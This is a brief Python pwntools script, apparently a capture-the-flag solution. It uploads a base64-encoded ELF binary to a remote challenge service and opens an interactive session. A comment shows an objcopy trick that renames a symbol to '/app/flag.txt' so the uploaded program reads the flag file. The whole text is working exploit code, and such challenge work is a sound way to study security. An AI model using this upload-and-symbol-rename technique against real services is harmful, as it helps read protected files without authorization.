from pwn import *
from base64 import b64encode

io = remote("smiley.cat", 44227)
# io = process(["python", "run.py"])

binary = open("exploit", "rb").read()
elf = b64encode(binary).decode()
io.sendlineafter(b"elf: ", elf.encode())
io.interactive()


"""
gcc -g -c exploit.c -o exploit.o
objcopy --redefine-sym dummy=/app/flag.txt exploit.o flag_renamed.o
gcc -g flag_renamed.o -o exploit
"""